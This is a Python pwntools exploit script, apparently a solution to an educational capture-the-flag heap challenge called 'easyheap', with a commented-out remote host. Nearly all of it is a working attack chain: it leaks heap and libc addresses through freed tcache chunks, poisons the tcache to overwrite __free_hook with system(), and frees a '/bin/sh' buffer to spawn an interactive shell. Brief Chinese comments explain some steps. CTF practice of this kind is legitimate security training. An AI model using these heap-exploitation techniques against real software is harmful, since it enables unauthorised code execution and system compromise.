#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
    
r = process('./easyheap')
# r = remote('edu-ctf.zoolab.org', 30211)

def add(idx, nlen, name, price):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Index: ', str(idx))
    r.sendlineafter("Length of name: ", str(nlen))
    r.sendafter('Name: ', name)
    r.sendlineafter('Price: ', str(price))

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Which book do you want to delete: ', str(idx))

def edit(idx, name, price):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Which book do you want to edit: ', str(idx))
    r.sendafter('Name: ', name)
    r.sendlineafter('Price: ', str(price))
    
def listall():
    r.sendlineafter('> ', '4')

def find(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('Index: ', str(idx))


add(0, 0x410, 'dummy', 0)
add(1, 0x410, 'dummy', 0) # 由於 freed chunk 相鄰 top chunk 時會觸發 consolidate，因此多放一塊 chk 來避免
delete(0)
delete(1)
listall()
r.recvuntil('Index:\t') # 透過 free 完 tcache 去 leak heap address
heap = int(r.recvline()) - 0x10
info(f"heap: {hex(heap)}")


edit(1, p64(heap + 0x2d0), 0)
gdb.attach(r)
find(0)
r.recvuntil('Name: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28
one_shot = libc + 0xe6c84
binsh = libc + 0x1b75aa
info(f"libc: {hex(libc)}")
edit(1, p64(0x0), 0)

add(7, 0x410, 'AAAAAAAA', 0)
add(8, 0x410, 'AAAAAAAA', 0)
add(2, 0x10, 'dummy', 1040)
add(3, 0x10, 'dummy', 0)
delete(2)
delete(3)
add(4, 0x20, p64(heap + 0xbe0) + p64(0x10000) + p64(0x10000) + p64(0x20), 0)

add(5, 0x10, 'dummy', 0)
delete(5)
edit(2, p64(heap + 0xb40) + p64(0x10000) + p64(0xdeadbeef), 0)
delete(5)
edit(2, p64(heap + 0xb90) + b'A'*0x10 + p64(0xdeadbeef), 0)
delete(5)
edit(3, p64(__free_hook - 8), 0)
add(6, 0x28, b'/bin/sh\x00' + p64(_system), 0)
delete(6)

r.interactive()